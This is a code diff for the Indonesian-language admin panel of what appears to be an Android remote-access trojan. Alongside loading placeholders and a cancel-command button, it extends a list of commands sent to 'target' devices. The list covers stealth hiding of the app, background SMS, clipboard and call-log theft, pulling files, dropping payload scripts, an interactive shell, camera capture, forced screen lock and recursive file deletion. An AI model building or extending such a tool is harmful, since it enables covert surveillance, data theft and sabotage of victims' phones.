@@ -318,6 +318,20 @@
                             </button>
                         </div>
                         <div class="flex-1 overflow-y-auto pr-2 space-y-3">
+                            <template x-if="isFetchingDevices && devices.length === 0">
+                                <div class="space-y-3">
+                                    <template x-for="i in 3" :key="i">
+                                        <div class="glass-panel p-4 rounded-2xl animate-pulse">
+                                            <div class="h-4 bg-white/10 rounded w-1/2 mb-3"></div>
+                                            <div class="h-3 bg-white/5 rounded w-3/4 mb-2"></div>
+                                            <div class="flex gap-2 mt-4">
+                                                <div class="h-6 bg-white/10 rounded w-16"></div>
+                                                <div class="h-6 bg-white/10 rounded w-16"></div>
+                                            </div>
+                                        </div>
+                                    </template>
+                                </div>
+                            </template>
                             <template x-for="device in devices" :key="device.id">
                                 <div class="glass-panel-hover p-4 rounded-2xl cursor-pointer transition-all border border-white/5"
                                     @click="selectedDevice = device.id"
@@ -373,7 +387,7 @@
                                     </div>
                                 </div>
                             </template>
-                            <div x-show="devices.length === 0"
+                            <div x-show="!isFetchingDevices && devices.length === 0"
                                 class="text-center py-12 flex flex-col items-center gap-3">
                                 <div
                                     class="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center text-gray-600">
@@ -578,6 +592,17 @@
                                 </tr>
                             </thead>
                             <tbody class="divide-y divide-white/5 font-mono text-[10px] md:text-xs">
+                                <template x-if="isFetchingLogs && logs.length === 0">
+                                    <template x-for="i in 10" :key="i">
+                                        <tr class="animate-pulse">
+                                            <td class="px-3 md:px-6 py-4"><div class="h-3 bg-white/5 rounded w-24"></div></td>
+                                            <td class="px-3 md:px-6 py-4"><div class="h-3 bg-white/5 rounded w-16"></div></td>
+                                            <td class="px-3 md:px-6 py-4 text-center"><div class="h-5 bg-white/5 rounded w-16 mx-auto"></div></td>
+                                            <td class="px-3 md:px-6 py-4"><div class="h-3 bg-white/5 rounded w-full"></div></td>
+                                            <td class="px-3 md:px-6 py-4 text-right hidden md:table-cell"><div class="h-8 bg-white/5 rounded w-20 ml-auto"></div></td>
+                                        </tr>
+                                    </template>
+                                </template>
                                 <template x-for="log in logs" :key="log.id">
                                     <tr @click="if(log.type !== 'cmd') openDetailModal(log.id)"
                                         class="hover:bg-white/5 transition-colors group cursor-pointer">
@@ -588,7 +613,7 @@
                                         <td class="px-3 md:px-6 py-3 md:py-4 text-center">
                                             <span
                                                 class="inline-block px-2 py-1 md:px-3 md:py-1.5 rounded-lg text-[9px] md:text-[10px] font-black uppercase tracking-widest border border-current"
-                                                :class="{'bg-rose-500/10 text-rose-400': ['ERROR'].includes(log.level), 'bg-emerald-500/10 text-emerald-400': ['INFO', 'completed'].includes(log.level), 'bg-amber-500/10 text-amber-400': ['WARN', 'pending'].includes(log.level), 'bg-blue-500/10 text-blue-400': log.level === 'sent'}"><span
+                                                :class="{'bg-rose-500/10 text-rose-400': ['ERROR', 'cancelled'].includes(log.level), 'bg-emerald-500/10 text-emerald-400': ['INFO', 'completed'].includes(log.level), 'bg-amber-500/10 text-amber-400': ['WARN', 'pending'].includes(log.level), 'bg-blue-500/10 text-blue-400': log.level === 'sent'}"><span
                                                     x-text="log.level"></span></span>
                                         </td>
                                         <td class="px-3 md:px-6 py-3 md:py-4 opacity-80">
@@ -600,17 +625,21 @@
                                             </div>
                                         </td>
                                         <td class="px-3 md:px-6 py-3 md:py-4 text-right hidden md:table-cell">
-                                            <button x-show="log.type !== 'cmd'" @click.stop="openDetailModal(log.id)"
-                                                class="px-4 py-2 rounded-xl text-primary bg-primary/10 hover:bg-primary/20 font-bold text-[11px] tracking-wide transition-colors active:scale-95 shadow-sm inline-flex gap-1.5 opacity-0 lg:group-hover:opacity-100"><svg
-                                                    class="w-4 h-4" fill="none" stroke="currentColor"
-                                                    viewBox="0 0 24 24">
-                                                    <path stroke-linecap="round" stroke-linejoin="round"
-                                                        stroke-width="2.5" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
-                                                    <path stroke-linecap="round" stroke-linejoin="round"
-                                                        stroke-width="2.5"
-                                                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z">
-                                                    </path>
-                                                </svg>Buka</button>
+                                            <div class="flex items-center justify-end gap-2">
+                                                <button x-show="['pending', 'sent'].includes(log.level)" @click.stop="cancelCommand(log.id)"
+                                                    class="px-3 py-1.5 rounded-lg text-rose-400 bg-rose-500/10 hover:bg-rose-500/20 font-bold text-[10px] tracking-wide transition-colors active:scale-95 shadow-sm inline-flex items-center gap-1 opacity-0 lg:group-hover:opacity-100">
+                                                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M6 18L18 6M6 6l12 12"></path>
+                                                    </svg> Batal
+                                                </button>
+                                                <button x-show="log.type !== 'cmd'" @click.stop="openDetailModal(log.id)"
+                                                    class="px-4 py-2 rounded-xl text-primary bg-primary/10 hover:bg-primary/20 font-bold text-[11px] tracking-wide transition-colors active:scale-95 shadow-sm inline-flex gap-1.5 opacity-0 lg:group-hover:opacity-100">
+                                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+                                                    </svg> Buka
+                                                </button>
+                                            </div>
                                         </td>
                                     </tr>
                                 </template>
@@ -1109,6 +1138,8 @@
                     { name: 'vibrate', desc: 'Getar paksa target. Payload: [durasi detik]', needsPayload: true },
                     { name: 'hide_app', desc: 'Sembunyikan panel (Stealth Mode/Kamuflase)', needsPayload: false },
                     { name: 'unhide_app', desc: 'Tampilkan kembali panel Control Panel dari kamuflase', needsPayload: false },
+                    { name: 'lock_screen', desc: 'Kunci layar perangkat secara paksa', needsPayload: false },
+                    { name: 'screen_on', desc: 'Hidupkan layar perangkat (Wake up)', needsPayload: false },
                     { name: 'torch', desc: 'Matikan/Nyalakan Senter. Payload: on / off', needsPayload: true },
                     { name: 'sensors', desc: 'Tarik daftar semua sensor manufaktur', needsPayload: false },
                     { name: 'photo front', desc: 'Uji Kamera Belakang/Selfie Base64', needsPayload: false },
@@ -1121,11 +1152,16 @@
                     { name: 'sms_send', desc: 'Background SMS. Payload: [nomor]|[pesan]', needsPayload: true },
                     { name: 'clipboard', desc: 'Baca teks Copy/Paste terbaru', needsPayload: false },
                     { name: 'get_call_logs', desc: 'Riwayat Telepon. Payload: [limit]', needsPayload: true },
-                    { name: 'get_installed_apps', desc: 'Tarik skema Package Name & App Terinstall', needsPayload: false },
+                    { name: 'app_list', desc: 'Tarik skema Package Name & App Terinstall', needsPayload: false },
+                    { name: 'launch_app', desc: 'Buka aplikasi berdasarkan package name. Payload: [pkg_name]', needsPayload: true },
+                    { name: 'uninstall_app', desc: 'Buka dialog uninstall aplikasi. Payload: [pkg_name]', needsPayload: true },
                     { name: 'ls', desc: 'Jelajah File Explorer. Payload: [path] (Cth: /sdcard/)', needsPayload: true },
-                    { name: 'download', desc: 'Sedot file dari remote target ke telegram', needsPayload: false },
-                    { name: 'upload', desc: 'Remote Upload payload script/file dropping', needsPayload: true },
+                    { name: 'download', desc: 'Sedot file dari remote target. Payload: [full_path]', needsPayload: true },
+                    { name: 'upload', desc: 'Remote Upload payload script/file dropping. Format: [path]^^^[base64]', needsPayload: true },
                     { name: 'shell', desc: 'Tarik BASH Terminal interaktif. Payload: [command]', needsPayload: true },
+                    { name: 'rm', desc: 'Hapus file/folder secara rekursif. Payload: [path]', needsPayload: true },
+                    { name: 'mv', desc: 'Pindah/Ganti nama file. Payload: [asal]|[tujuan]', needsPayload: true },
+                    { name: 'find', desc: 'Cari file di direktori. Payload: [root_path]|[query]', needsPayload: true },
                     { name: 'notify', desc: 'Kirim Push Notification. Payload: [Title]|[Body]', needsPayload: true },
                     { name: 'open_url', desc: 'Paksa target membuka link/browser. Payload: [link]', needsPayload: true },
                     { name: 'set_wallpaper', desc: 'Ganti Background Layar instan. Payload: [url_gambar]', needsPayload: true },
@@ -1160,6 +1196,23 @@
                     } catch (e) {
                         console.error('Gagal memuat statistik', e);
                     }
+                },
+
+                async cancelCommand(id) {
+                    this.customConfirm('Batalkan Perintah', 'Apakah Anda yakin ingin membatalkan perintah ini? Jika statusnya sudah terkirim (sent), perintah mungkin tetap dijalankan jika perangkat sudah memprosesnya.', async () => {
+                        try {
+                            const res = await fetch('/admin/api/command/' + id, { method: 'DELETE' });
+                            if (res.ok) {
+                                this.showToast('Perintah berhasil dibatalkan.', 'success');
+                                this.fetchLogs();
+                            } else {
+                                const err = await res.json();
+                                this.showToast('Gagal: ' + (err.error || 'Server error'), 'error');
+                            }
+                        } catch (e) {
+                            this.showToast('Gangguan jaringan saat membatalkan.', 'error');
+                        }
+                    });
                 },
 
                 renderCharts() {
